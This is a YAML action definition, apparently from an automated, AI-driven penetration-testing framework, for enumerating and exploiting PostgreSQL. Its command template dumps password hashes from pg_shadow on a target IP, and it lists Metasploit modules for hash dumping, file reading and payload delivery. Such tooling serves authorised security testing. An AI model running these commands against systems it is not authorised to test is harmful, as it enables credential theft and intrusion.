name: postgres_enum
category: services
description: PostgreSQL enumeration and exploitation
preconditions:
- service.port==5432
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: 'psql -h {target_ip} -U {username} -c ''\l; SELECT * FROM pg_shadow;''

  '
parser: generic_parser
expected_effects:
- postgres_access
- has_cred
falsifier:
  pattern: error|failed|refused|denied
  timeout: 120
model_tier: haiku
mechanism: msf> use auxiliary/scanner/postgres/postgres_hashdump msf> use auxiliary/scanner/postgres/postgres_schemadump
  msf> use auxiliary/admin/postgres/postgres_readfile msf> use exploit/linux/postgres/postgres_payload
hacktricks_ref: network-services-pentesting/pentesting-postgresql.md
